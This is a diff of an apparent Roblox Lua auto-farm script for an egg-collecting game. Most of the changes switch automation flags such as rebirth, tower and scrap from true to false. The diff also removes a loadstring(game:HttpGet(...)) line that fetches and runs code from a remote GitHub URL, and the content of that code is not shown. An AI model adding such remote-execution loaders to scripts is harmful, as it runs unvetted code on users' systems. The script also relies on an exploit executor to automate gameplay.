@@ -3,8 +3,6 @@
 -- Architecture: ConnectionManager -> Live GameState (Validity Checked) -> RecoveryManager -> Action Lock -> Multi-Cadence Scheduler -> Monitoring Dashboard
 -- ======================================================================================
 
-loadstring(game:HttpGet("https://raw.githubusercontent.com/aslamdunk7/paypmboygang/refs/heads/main/ChickChick"))()
-
 local CoreGui = game:GetService("CoreGui")
 local Players = game:GetService("Players")
 local LocalPlayer = Players.LocalPlayer or Players.PlayerAdded:Wait()
@@ -1127,16 +1125,16 @@ local runService = game:GetService("RunService")
 local localPlayer = playersService.LocalPlayer or playersService.PlayerAdded:Wait()
 
 getgenv().autoMasterEngineEnabled = true
-getgenv().autoCollectEggEnabled = true
-getgenv().autoRebirthEnabled = true
-getgenv().autoUpgradeFeederEnabled = true
-getgenv().autoBuyFeederEnabled = true
-getgenv().autoUpgradeCoopEnabled = true
-getgenv().autoTowerEnabled = true
-getgenv().autoTowerLastFloorEnabled = true
-getgenv().towerDelaySeconds = 3
-getgenv().autoScrapEnabled = true
-getgenv().autoWorldEventEnabled = true
+getgenv().autoCollectEggEnabled = false
+getgenv().autoRebirthEnabled = false
+getgenv().autoUpgradeFeederEnabled = false
+getgenv().autoBuyFeederEnabled = false
+getgenv().autoUpgradeCoopEnabled = false
+getgenv().autoTowerEnabled = false
+getgenv().autoTowerLastFloorEnabled = false
+getgenv().towerDelaySeconds = 5
+getgenv().autoScrapEnabled = false
+getgenv().autoWorldEventEnabled = false
 getgenv().autoFusionEnabled = false
 getgenv().walkSpeedEnabled = false
 getgenv().walkSpeedMultiplier = 2
